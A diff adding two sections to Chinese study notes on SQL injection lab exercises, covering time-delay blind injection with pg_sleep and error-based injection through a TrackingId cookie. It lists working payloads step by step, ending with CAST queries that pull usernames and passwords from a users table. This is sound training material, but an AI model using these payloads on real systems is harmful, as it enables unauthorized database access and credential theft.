@@ -121,6 +121,31 @@
 
 ##总结：盲注就是在数据库无法直接爆出密码时，采用‘逼问’的方式进行【只能猜】，好消息可以自动化完成【python脚本自动化】
 
+##关卡十一：Blind SQL injection with time delays【让数据库睡一会】
+**目标**：让数据库沉默一会儿
+**攻击payload**:1.采用BP抓包，找到cookie部分
+                2.找到TrackingId=x添加'||pg_sleep(10)--
+**原理**：1.'(分号)闭合前面数据库语句
+          2.||拼接符
+          3.pg_sleep(10):让数据库罚站10秒
+          4.--注释
+
+##关卡十二：Visible error-based SQL injection【错误可视化，逼问的时候说漏了】
+**目标**：拿下管理员密码
+**攻击payload**：1.TrackingId=ogAZZfxtOKUELbuJ'【闭合尝试】
+                 2.TrackingId=ogAZZfxtOKUELbuJ'--【注释尝试】
+                 3.TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--【引入CAST语句】，报错AND语句有问题
+                 4.TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--【修改使AND语句可用】
+                 5.TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--【语句过长】
+                 6.TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--【删除多余】
+                 7.TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--【可行，套出管理员】
+                 8.TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--【套出密码】
+**原理**：1.'(单引号)闭合前面数据库语句
+          2.`1=CAST(值 AS int)` 是一个比较表达式，满足 AND 的语法要求。
+          3.SELECT password FROM users：数据库查询语句
+          4.LIMIT 1:限制仅有一行
+
+
 
 
 
